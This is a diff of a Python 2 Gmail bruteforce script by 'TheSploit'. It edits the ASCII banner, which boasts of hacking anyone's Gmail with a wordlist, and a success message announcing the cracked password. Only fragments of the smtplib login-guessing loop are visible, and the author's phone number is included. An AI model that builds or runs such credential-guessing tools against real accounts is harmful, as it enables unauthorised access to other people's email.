@@ -6,20 +6,20 @@ from os import system
 
 def main():
    print '==========================================='
-   print '= Author  :TheSploit 	                   l'
-   print '= Whatsapp:081316577616       	          l'
-   print '= GitHub  :https://github.com/TheSploit    l'
+   print '= Gmail Bruteforce Attack                  l'
+   print '= Attack Gmail Victim with Wordlist        l'
+   print '= Hack Everyone Gmail with Tools + Wordlistl'
    print '==========================================='
    print '\n                                               '
    print '  ________________________________________________ '
    print '  /                                                \ '
    print ' |    _________________________________________     |' 
    print ' |   |                                         |    |'
-   print ' |   |  C:\> _   Gmail Bruteforce              |    |'
-   print ' |   |                                         |    |'
-   print ' |   |                                         |    |'
-   print ' |   |                                         |    |'
-   print ' |   |                                         |    |'
+   print ' |   |  ===================================    |    |'
+   print ' |   |   Author  :TheSploit                    |    |'
+   print ' |   |   Whatsapp:081316577616                 |    |'
+   print ' |   |   GitHub  :https://github.com/TheSploit |    |'
+   print ' |   |  ===================================    |    |'
    print ' |   |                                         |    |'
    print ' |   |                                         |    |'
    print ' |   |                                         |    |'
@@ -57,7 +57,7 @@ def login():
          system('clear')
          main()
          print '\n'
-         print '[+] Password dari Akun ini Berhasil diRetas :' + password + '     <<'
+         print '[+] Password dari Akun ini Berhasil di Retas :' + password + '     <<'
          break
       except smtplib.SMTPAuthenticationError as e:
          error = str(e)
